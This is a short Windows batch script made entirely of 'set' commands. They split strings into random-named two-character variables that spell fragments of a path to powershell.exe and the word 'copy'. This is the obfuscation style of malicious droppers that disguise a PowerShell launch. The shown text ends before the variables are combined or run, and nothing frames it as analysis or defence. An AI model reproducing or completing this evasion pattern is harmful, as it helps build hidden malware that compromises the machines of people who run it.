@echo off
set "LhuomIQiPs=he"
set "QfUEkGdBVo=ws"
set "dShyNOnFCF=Po"
set "KOsSXkanct=:\"
set "VIEXftxUQd=em"
set "MNlrLCnKPO=.e"
set "lhbFJOtgiF=py"
set "rLCCNFVPCZ=32"
set "pCyWZigXAQ=in"
set "fFcmMSclMA=he"
set "UmoitdVCEd=we"
set "QLVGkiezDF=Sy"
set "spFccQpFNr=\W"
set "ryDKthRztL=po"
set "aXNCSbXPWD=\v"
set "wbUrBjHTMt=rS"
set "gtTiATVbYw=1."
set "BjOAEIZsAJ= C"
set "xOLeXSRjpb=ll"
set "ABDbmqjVvS=co"
set "ytFQyXWdDJ=y "
set "OfdPdkZbAU=s\"
set "KjJzoKunKv=do"
